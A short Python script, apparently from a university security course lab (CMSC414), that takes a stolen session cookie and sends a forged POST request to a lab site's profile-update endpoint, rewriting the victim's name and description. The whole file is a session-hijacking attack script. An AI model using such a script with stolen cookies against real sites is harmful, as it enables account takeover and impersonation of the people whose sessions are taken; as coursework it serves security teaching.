import requests
import sys

# Session cookie should be in sys.argv[1]
# Argument should be session cookie itself, 
# not `session=...`
if len(sys.argv) < 2:
	print("Usage: python3 HTTPSimpleForge.py <session-cookie>")
	sys.exit(1)

# Update as needed
url = "http://now.share/update_profile"
st0len_cookie = sys.argv[1]

headers = {
	'User-agent':'CMSC414-Forge',
    'Cookie': f'session={st0len_cookie}'
}

data = {
    "full_name": "Kathy Gdon",
    "description": "Bob is a l33t h4x0r!"
}

r = requests.post(url, timeout=(60000, 90000), data=data, headers=headers)
print(r.content)